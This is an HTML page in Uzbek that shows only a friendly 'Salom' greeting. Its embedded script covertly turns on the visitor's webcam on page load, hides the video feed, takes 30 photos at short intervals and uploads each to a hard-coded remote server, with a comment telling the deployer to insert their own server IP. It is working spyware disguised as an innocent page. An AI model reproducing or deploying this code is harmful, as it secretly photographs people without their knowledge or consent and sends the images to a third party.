<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Kulib turing</title>
  <style>
    html,body { height:100%; margin:0; background:#000; }
    .center {
      height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      user-select:none;
      -webkit-user-select:none;
    }
    .msg {
      color: blue;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      font-size: clamp(36px, 8vw, 96px);
      letter-spacing: 2px;
      text-align:center;
    }
    video, canvas { display:none !important; }
  </style>
</head>
<body>
  <div class="center">
    <div class="msg">Salom üòâ</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const TOTAL_PHOTOS = 30;     // test uchun 5 ta
    const INTERVAL_MS = 800;    // 0.8s oraliq
    const sessionId = String(Math.floor(Date.now() / 1000));

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    async function startHiddenCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        await new Promise(resolve => {
          if (video.readyState >= 2) resolve();
          else video.onloadedmetadata = () => resolve();
        });

        let count = 0;

        function takeOne() {
          canvas.width = video.videoWidth || 1280;
          canvas.height = video.videoHeight || 720;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(async (blob) => {
            count++;
            const form = new FormData();
            form.append('photo', blob, `${sessionId}_${String(count).padStart(2,'0')}.jpg`);
            form.append('session_id', sessionId);
            form.append('seq', String(count));
            form.append('total', String(TOTAL_PHOTOS));

            try {
              // ‚ö†Ô∏è BU YERDA SERVER_IP ni o‚Äòzingnikiga almashtir
              await fetch('http://13.60.29.35:8008/upload', {
                method: 'POST',
                body: form
              });
              console.log(`Sent ${count}/${TOTAL_PHOTOS}`);
            } catch (err) {
              console.error('Upload error', err);
            }

            if (count < TOTAL_PHOTOS) {
              setTimeout(takeOne, INTERVAL_MS);
            } else {
              stream.getTracks().forEach(t => t.stop());
              console.log('All photos sent.');
            }
          }, 'image/jpeg', 0.9);
        }

        setTimeout(takeOne, 600);
      } catch (e) {
        console.error('Camera error:', e);
      }
    }

    startHiddenCapture();
  </script>
</body>
</html>
